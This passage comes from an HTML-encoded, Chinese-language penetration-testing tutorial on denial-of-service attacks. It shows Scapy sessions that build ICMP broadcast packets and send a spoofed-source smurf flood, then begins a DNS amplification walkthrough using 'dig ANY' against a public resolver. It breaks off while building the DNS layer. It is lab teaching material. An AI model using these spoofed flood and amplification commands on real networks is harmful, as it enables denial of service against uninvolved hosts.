+<p>&#x4E3A;&#x4E86;&#x5C1D;&#x8BD5;&#x6267;&#x884C;&#x4F20;&#x7EDF;&#x7684; smurf &#x653B;&#x51FB;&#xFF0C;Scapy &#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x4ECE;&#x96F6;&#x5F00;&#x59CB;&#x6784;&#x5EFA;&#x5FC5;&#x8981;&#x7684;&#x6570;&#x636E;&#x5305;&#x3002; &#x4E3A;&#x4E86;&#x4ECE; Kali Linux &#x547D;&#x4EE4;&#x884C;&#x4F7F;&#x7528; Scapy&#xFF0C;&#x8BF7;&#x4ECE;&#x7EC8;&#x7AEF;&#x4F7F;&#x7528;<code>scapy</code>&#x547D;&#x4EE4;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002; &#x4E3A;&#x4E86;&#x5411;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x53D1;&#x9001; ICMP &#x8BF7;&#x6C42;&#xFF0C;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x9996;&#x5148;&#x6784;&#x5EFA;&#x6B64;&#x8BF7;&#x6C42;&#x7684;&#x5C42;&#x7EA7;&#x3002; &#x6211;&#x4EEC;&#x5C06;&#x9700;&#x8981;&#x6784;&#x5EFA;&#x7684;&#x7B2C;&#x4E00;&#x5C42;&#x662F; IP &#x5C42;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
+&gt;&gt;&gt; i = IP() 
+&gt;&gt;&gt; i.display() 
+###[ IP ]###  
+    version= 4  
+    ihl= None
+    tos= 0x0
+    len= None
+    id= 1
+    flags=
+    frag= 0
+    ttl= 64
+    proto= ip
+    chksum= None
+    src= 127.0.0.1
+    dst= 127.0.0.1
+    \options\ 
+&gt;&gt;&gt; i.dst = &quot;172.16.36.255&quot; 
+&gt;&gt;&gt; i.display() 
+###[ IP ]###
+    version= 4
+    ihl= None
+    tos= 0x0
+    len= None
+    id= 1
+    flags=
+    frag= 0
+    ttl= 64
+    proto= ip
+    chksum= None
+    src= 172.16.36.224
+    dst= 172.16.36.255
+    \options\
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5C06; <code>IP</code> &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x53D8;&#x91CF;<code>i</code>&#x3002; &#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x8BE5;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x914D;&#x7F6E;&#x3002; &#x901A;&#x5E38;&#xFF0C;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x5730;&#x5740;&#x90FD;&#x8BBE;&#x4E3A;&#x56DE;&#x9001;&#x5730;&#x5740;<code>127.0.0.1</code>&#x3002; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06;<code>i.dst</code>&#x8BBE;&#x7F6E;&#x4E3A;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x503C;&#xFF0C;&#x6765;&#x66F4;&#x6539;&#x76EE;&#x6807;&#x5730;&#x5740;&#x5E76;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;&#x503C;&#x3002; &#x901A;&#x8FC7;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4E0D;&#x4EC5;&#x66F4;&#x65B0;&#x4E86;&#x76EE;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x800C;&#x4E14;<code>Scapy</code>&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x6E90; IP &#x5730;&#x5740;&#x66F4;&#x65B0;&#x4E3A;&#x4E0E;&#x9ED8;&#x8BA4;&#x63A5;&#x53E3;&#x76F8;&#x5173;&#x7684;&#x5730;&#x5740;&#x3002; &#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x7EE7;&#x7EED;&#x6784;&#x5EFA; ICMP &#x5C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; ping = ICMP() 
+&gt;&gt;&gt; ping.display() 
+###[ ICMP ]###  
+    type= echo-request  
+    code= 0  
+    chksum= None  
+    id= 0x0  
+    seq= 0x0
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; ICMP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E; IP &#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;ICMP &#x5C42;&#x5DF2;&#x914D;&#x7F6E;&#x4E3A;&#x6267;&#x884C;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#x3002; &#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#x4E86; IP &#x548C; ICMP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5806;&#x53E0;&#x8FD9;&#x4E9B;&#x5C42;&#x6765;&#x6784;&#x9020;&#x8BF7;&#x6C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; request = (i/ping) 
+&gt;&gt;&gt; request.display() 
+###[ IP ]###  
+    version= 4  
+    ihl= None  
+    tos= 0x0  
+    len= None  
+    id= 1
+    flags=  
+    frag= 0  
+    ttl= 64  
+    proto= icmp  
+    chksum= None  
+    src= 172.16.36.224  
+    dst= 172.16.36.255  
+    \options\ 
+###[ ICMP ]###  
+    type= echo-request  
+    code= 0  
+    chksum= None  
+    id= 0x0  
+    seq= 0x0 
+&gt;&gt;&gt; send(request) 
+. 
+Sent 1 packets.
+</code></pre><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x5206;&#x9694;&#x53D8;&#x91CF;&#xFF0C;&#x6765;&#x5806;&#x53E0; IP &#x548C; ICMP &#x5C42;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x5C42;&#x53CA;&#x8D4B;&#x7ED9;&#x8868;&#x793A;&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x65B0;&#x53D8;&#x91CF;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x67E5;&#x770B;&#x8BF7;&#x6C42;&#x7684;&#x914D;&#x7F6E;&#x3002; &#x4E00;&#x65E6;&#x5EFA;&#x7ACB;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x4F20;&#x9012;&#x7ED9;&#x51FD;&#x6570;&#x3002; &#x53EF;&#x4EE5;&#x4F7F;&#x7528; Wireshark &#x6216; TCPdump &#x7B49;&#x6570;&#x636E;&#x5305;&#x6355;&#x83B7;&#x5DE5;&#x5177;&#x6765;&#x76D1;&#x63A7;&#x7ED3;&#x679C;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;Wireshark &#x663E;&#x793A;&#xFF0C;LAN &#x4E0A;&#x7684;&#x4E24;&#x4E2A; IP &#x5730;&#x5740;&#x54CD;&#x5E94;&#x4E86;&#x5E7F;&#x64AD;&#x56DE;&#x54CD;&#x8BF7;&#x6C42;&#xFF1A;</p>
+<p><img src="img/6-3-1.jpg" alt=""></p>
+<p>&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x4E24;&#x4E2A;&#x54CD;&#x5E94;&#x5730;&#x5740;&#x4E0D;&#x8DB3;&#x4EE5;&#x6267;&#x884C;&#x6709;&#x6548;&#x7684; DoS &#x653B;&#x51FB;&#x3002; &#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x7EC3;&#x4E60;&#x590D;&#x5236;&#x5230;&#x53E6;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x534A;&#x73B0;&#x4EE3;&#x5316;&#x4E3B;&#x673A;&#x7684;&#x5B9E;&#x9A8C;&#x5BA4;&#x4E2D;&#xFF0C;&#x7ED3;&#x679C;&#x5F88;&#x53EF;&#x80FD;&#x662F;&#x7C7B;&#x4F3C;&#x7684;&#x3002; &#x5728;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x54CD;&#x5E94;&#x5730;&#x5740;&#x6765;&#x89E6;&#x53D1;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6E90;&#x5730;&#x5740;&#x5C06;&#x9700;&#x8981;&#x66FF;&#x6362;&#x4E3A;&#x4E86;&#x653B;&#x51FB;&#x76EE;&#x6807;&#x7684; IP &#x5730;&#x5740;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; send(IP(dst=&quot;172.16.36.255&quot;,src=&quot;172.16.36.135&quot;)/ ICMP(),count=100,verbose=1) 
+......................................................................... ........................... 
+Sent 100 packets.
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;Scapy &#x7684;&#x5355;&#x884C;&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x4E0E;&#x4E4B;&#x524D;&#x8BA8;&#x8BBA;&#x7684;&#x76F8;&#x540C;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x6B64;&#x65F6;&#x9664;&#x5916;&#xFF0C;&#x6E90; IP &#x5730;&#x5740;&#x88AB;&#x4F2A;&#x9020;&#x4E3A; LAN &#x4E0A;&#x53E6;&#x4E00;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x5730;&#x5740;&#x3002; &#x6B64;&#x5916;&#xFF0C;<code>count</code>&#x53EF;&#x7528;&#x4E8E;&#x6309;&#x987A;&#x5E8F;&#x53D1;&#x9001;&#x591A;&#x4E2A;&#x8BF7;&#x6C42;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x539F;&#x7406;&#x662F;&#x5229;&#x7528;&#x7B2C;&#x4E09;&#x65B9;&#x8BBE;&#x5907;&#xFF0C;&#x4F7F;&#x7F51;&#x7EDC;&#x6D41;&#x91CF;&#x538B;&#x5012;&#x76EE;&#x6807;&#x3002; &#x5BF9;&#x4E8E;&#x591A;&#x6570;&#x653E;&#x5927;&#x653B;&#x51FB;&#xFF0C;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li>&#x7528;&#x4E8E;&#x6267;&#x884C;&#x653B;&#x51FB;&#x7684;&#x534F;&#x8BAE;&#x4E0D;&#x9A8C;&#x8BC1;&#x8BF7;&#x6C42;&#x6E90;</li>
+<li>&#x6765;&#x81EA;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x7F51;&#x7EDC;&#x529F;&#x80FD;&#x7684;&#x54CD;&#x5E94;&#x5E94;&#x8BE5;&#x663E;&#x7740;&#x5927;&#x4E8E;&#x7528;&#x4E8E;&#x8BF7;&#x6C42;&#x5B83;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>
+</ul>
+<p>&#x4F20;&#x7EDF; smurf &#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x53D6;&#x51B3;&#x4E8E; LAN &#x4E0A;&#x54CD;&#x5E94; IP &#x5B9A;&#x5411;&#x7684;&#x5E7F;&#x64AD;&#x6D41;&#x91CF;&#x7684;&#x4E3B;&#x673A;&#x3002; &#x8FD9;&#x79CD;&#x4E3B;&#x673A;&#x4ECE;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684;&#x4F2A;&#x9020; IP &#x5730;&#x5740;&#x63A5;&#x6536; ICMP &#x5E7F;&#x64AD;&#x56DE;&#x54CD;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x9488;&#x5BF9;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x540C;&#x65F6;&#x8FD4;&#x56DE; ICMP &#x56DE;&#x54CD;&#x5E94;&#x7B54;&#x3002;</p>
+<h2 id="64-dns-&#x653E;&#x5927;-dos-&#x653B;&#x51FB;">6.4 DNS &#x653E;&#x5927; DoS &#x653B;&#x51FB;</h2>
+<p>DNS&#x653E;&#x5927;&#x653B;&#x51FB;&#x901A;&#x8FC7;&#x5BF9;&#x7ED9;&#x5B9A;&#x57DF;&#x6267;&#x884C;&#x6240;&#x6709;&#x7C7B;&#x578B;&#x8BB0;&#x5F55;&#x7684;&#x4F2A;&#x9020;&#x67E5;&#x8BE2;&#xFF0C;&#x6765;&#x5229;&#x7528;&#x5F00;&#x653E;&#x7684; DNS &#x89E3;&#x6790;&#x5668;&#x3002; &#x901A;&#x8FC7;&#x540C;&#x65F6;&#x5411;&#x591A;&#x4E2A;&#x5F00;&#x653E;&#x7684;&#x89E3;&#x6790;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x6765;&#x4F7F;&#x7528; DDoS &#x7EC4;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x6A21;&#x62DF; DNS &#x653E;&#x5927;&#x653B;&#x51FB;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x672C;&#x5730;&#x540D;&#x79F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6216;&#x77E5;&#x9053;&#x4E00;&#x4E2A;&#x5F00;&#x653E;&#x548C;&#x53EF;&#x516C;&#x5F00;&#x8BBF;&#x95EE;&#x7684;&#x540D;&#x79F0;&#x670D;&#x52A1;&#x5668;&#x7684; IP &#x5730;&#x5740;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x5C06; Ubuntu &#x7528;&#x4F5C;&#x626B;&#x63CF;&#x76EE;&#x6807;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Ubuntu &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Ubuntu Server&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E3A;&#x4E86;&#x4E86;&#x89E3; DNS &#x653E;&#x5927;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x57FA;&#x672C;&#x7684; DNS &#x67E5;&#x8BE2;&#x5DE5;&#x5177;&#xFF0C;&#x5982;<code>host</code>&#xFF0C;<code>dig</code>&#x6216;<code>nslookup</code>&#x3002; &#x901A;&#x8FC7;&#x5BF9;&#x4E0E;&#x5DF2;&#x5EFA;&#x7ACB;&#x7684;&#x57DF;&#x76F8;&#x5173;&#x7684;&#x6240;&#x6709;&#x8BB0;&#x5F55;&#x7C7B;&#x578B;&#x6267;&#x884C;&#x8BF7;&#x6C42;&#xFF0C;&#x4F60;&#x5C06;&#x6CE8;&#x610F;&#x5230;&#x4E00;&#x4E9B;&#x8BF7;&#x6C42;&#x8FD4;&#x56DE;&#x4E86;&#x76F8;&#x5F53;&#x5927;&#x7684;&#x54CD;&#x5E94;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# dig ANY google.com @208.67.220.220
+
+; &lt;&lt;&gt;&gt; DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;&gt;&gt; ANY google.com @208.67.220.220 
+;; global options: +cmd
+;; Got answer: 
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41539 
+;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 0
+;; QUESTION SECTION: ;
+google.com.         IN   ANY
+;; ANSWER SECTION: 
+google.com.      181   IN   A   74.125.232.101 
+google.com.      181   IN   A   74.125.232.97 
+google.com.      181   IN   A   74.125.232.102 
+google.com.      181   IN   A   74.125.232.99 
+google.com.      181   IN   A   74.125.232.104 
+google.com.      181   IN   A   74.125.232.96 
+google.com.      181   IN   A   74.125.232.100 
+google.com.      181   IN   A   74.125.232.103 
+google.com.      181   IN   A   74.125.232.105 
+google.com.      181   IN   A   74.125.232.98 
+google.com.      181   IN   A   74.125.232.110 
+google.com.      174   IN   AAAA   2607:f8b0:4004:803::1007 
+google.com.      167024   IN   NS   ns2.
+google.com. 
+google.com.      167024   IN   NS   ns1.
+google.com. 
+google.com.      167024   IN   NS   ns3.
+google.com. 
+google.com.      167024   IN   NS   ns4.
+google.com. 
+google.com.      60   IN   SOA   ns1.
+google.com. dns-admin.
+google.com. 1545677 7200 1800 1209600 300
+
+;; Query time: 7 msec 
+;; SERVER: 208.67.220.220#53(208.67.220.220) 
+;; WHEN: Thu Dec 19 02:40:16 2013 
+;; MSG SIZE  rcvd: 35
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x4E0E;<code>google.com</code>&#x57DF;&#x76F8;&#x5173;&#x7684;&#x6240;&#x6709;&#x8BB0;&#x5F55;&#x7C7B;&#x578B;&#x7684;&#x8BF7;&#x6C42;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x4E2A;&#x54CD;&#x5E94;&#xFF0C;&#x5305;&#x542B;11&#x4E2A;A&#x8BB0;&#x5F55;&#xFF0C;1&#x4E2A;AAAA&#x8BB0;&#x5F55;&#xFF0C;4&#x4E2A;NS&#x8BB0;&#x5F55;&#x548C;1&#x4E2A;SOA&#x8BB0;&#x5F55;&#x3002; DNS&#x653E;&#x5927;&#x653B;&#x51FB;&#x7684;&#x6548;&#x7387;&#x4E0E;&#x54CD;&#x5E94;&#x5927;&#x5C0F;&#x76F4;&#x63A5;&#x76F8;&#x5173;&#x3002; &#x6211;&#x4EEC;&#x73B0;&#x5728;&#x5C06;&#x5C1D;&#x8BD5;&#x4F7F;&#x7528; Scapy &#x4E2D;&#x6784;&#x5EFA;&#x7684;&#x6570;&#x636E;&#x5305;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x64CD;&#x4F5C;&#x3002; &#x8981;&#x53D1;&#x9001;&#x6211;&#x4EEC;&#x7684; DNS &#x67E5;&#x8BE2;&#x8BF7;&#x6C42;&#xFF0C;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x9996;&#x5148;&#x6784;&#x5EFA;&#x6B64;&#x8BF7;&#x6C42;&#x7684;&#x5C42;&#x7EA7;&#x3002; &#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x5EFA;&#x7684;&#x7B2C;&#x4E00;&#x5C42;&#x662F; IP &#x5C42;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
+&gt;&gt;&gt; i = IP() 
+&gt;&gt;&gt; i.display() 
+###[ IP ]###
+    version= 4
+    ihl= None
+    tos= 0x0
+    len= None
+    id= 1
+    flags=
+    frag= 0
+    ttl= 64
+    proto= ip
+    chksum= None
+    src= 127.0.0.1
+    dst= 127.0.0.1
+    \options\ 
+&gt;&gt;&gt; i.dst = &quot;208.67.220.220&quot; 
+&gt;&gt;&gt; i.display() 
+###[ IP ]###
+    version= 4
+    ihl= None
+    tos= 0x0
+    len= None
+    id= 1
+    flags=
+    frag= 0
+    ttl= 64
+    proto= ip
+    chksum= None
+    src= 172.16.36.180
+    dst= 208.67.220.220
+    \options\
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5C06; <code>IP</code> &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x53D8;&#x91CF;<code>i</code>&#x3002; &#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x8BE5;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x914D;&#x7F6E;&#x3002; &#x901A;&#x5E38;&#xFF0C;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x5730;&#x5740;&#x90FD;&#x8BBE;&#x4E3A;&#x56DE;&#x9001;&#x5730;&#x5740;<code>127.0.0.1</code>&#x3002; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06;<code>i.dst</code>&#x8BBE;&#x7F6E;&#x4E3A;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x503C;&#xFF0C;&#x6765;&#x66F4;&#x6539;&#x76EE;&#x6807;&#x5730;&#x5740;&#x5E76;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;&#x503C;&#x3002; &#x901A;&#x8FC7;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4E0D;&#x4EC5;&#x66F4;&#x65B0;&#x4E86;&#x76EE;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x800C;&#x4E14;<code>Scapy</code>&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x6E90; IP &#x5730;&#x5740;&#x66F4;&#x65B0;&#x4E3A;&#x4E0E;&#x9ED8;&#x8BA4;&#x63A5;&#x53E3;&#x76F8;&#x5173;&#x7684;&#x5730;&#x5740;&#x3002; &#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86;&#x8BF7;&#x6C42;&#x7684; IP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x7EE7;&#x7EED;&#x6784;&#x5EFA; UDP &#x5C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; u = UDP() 
+&gt;&gt;&gt; u.display() 
+###[ UDP ]###  
+    sport= domain  
+    dport= domain  
+    len= None  
+    chksum= None 
+&gt;&gt;&gt; u.dport 53
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; UDP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E;IP&#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;<code>UDP</code> &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x4E86;<code>u</code>&#x53D8;&#x91CF;&#x3002; &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x786E;&#x5B9A;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6E90;&#x548C;&#x76EE;&#x6807;&#x7AEF;&#x53E3;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x90FD;&#x5217;&#x4E3A;<code>domain</code>&#x3002; &#x60A8;&#x53EF;&#x80FD;&#x80FD;&#x731C;&#x5230;&#xFF0C;&#x8FD9;&#x8868;&#x793A;&#x4E0E;&#x7AEF;&#x53E3; 53 &#x76F8;&#x5173;&#x7684; DNS&#x670D; &#x52A1;&#x3002;DNS &#x662F;&#x4E00;&#x79CD;&#x5E38;&#x89C1;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x901A;&#x5E38;&#x53EF;&#x4EE5;&#x5728;&#x7F51;&#x7EDC;&#x7CFB;&#x7EDF;&#x4E0A;&#x53D1;&#x73B0;&#x3002; &#x8981;&#x786E;&#x8BA4;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5F15;&#x7528;&#x53D8;&#x91CF;&#x540D;&#x548C;&#x5C5E;&#x6027;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x8BE5;&#x503C;&#x3002; &#x65E2;&#x7136;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86; IP &#x548C; UDP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x5EFA; DNS &#x5C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; d = DNS() 
+&gt;&gt;&gt; d.display() 
+###[ DNS ]###
+  id= 0
+  qr= 0
+  opcode= QUERY
+  aa= 0
+  tc= 0
+  rd= 0
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 0
+  ancount= 0
+  nscount= 0
+  arcount= 0
+  qd= None
+  an= None
+  ns= None
+  ar= None
+</code></pre><p>&#x4E3A;&#x4E86;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684;DNS&#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E; IP &#x548C; UDP &#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;DNS &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x4E86;<code>d</code>&#x53D8;&#x91CF;&#x3002; &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x786E;&#x5B9A;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x51E0;&#x4E2A;&#x503C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; d.rd = 1 
+&gt;&gt;&gt; d.qdcount = 1 
+&gt;&gt;&gt; d.display() 
+###[ DNS ]###
+  id= 0
+  qr= 0
+  opcode= QUERY
+  aa= 0
+  tc= 0
+  rd= 1
+  ra= 0
+  z= 0
+  rcode= ok
+  qdcount= 1
+  ancount= 0
+  nscount= 0
+  arcount= 0
+  qd= None
+  an= None
+  ns= None  
+  ar= None
+</code></pre><p>RD &#x4F4D;&#x9700;&#x8981;&#x88AB;&#x6FC0;&#x6D3B;; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06;<code>rd</code>&#x503C;&#x8BBE;&#x7F6E;&#x4E3A; 1 &#x6765;&#x5B9E;&#x73B0;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x9700;&#x8981;&#x4E3A;<code>qdcount</code>&#x63D0;&#x4F9B;&#x503C;<code>0x0001</code>; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x4F9B;&#x6574;&#x6570;&#x503C; 1 &#x6765;&#x5B8C;&#x6210;&#x3002;&#x901A;&#x8FC7;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x8C03;&#x6574;&#x4E86;&#x914D;&#x7F6E;&#x3002; &#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86; IP&#xFF0C;UDP &#x548C; DNS &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x5EFA;&#x4E00;&#x4E2A; DNS &#x95EE;&#x9898;&#x8BB0;&#x5F55;&#x4EE5;&#x5206;&#x914D;&#x7ED9;<code>qd</code>&#x503C;&#xFF1A;</p>
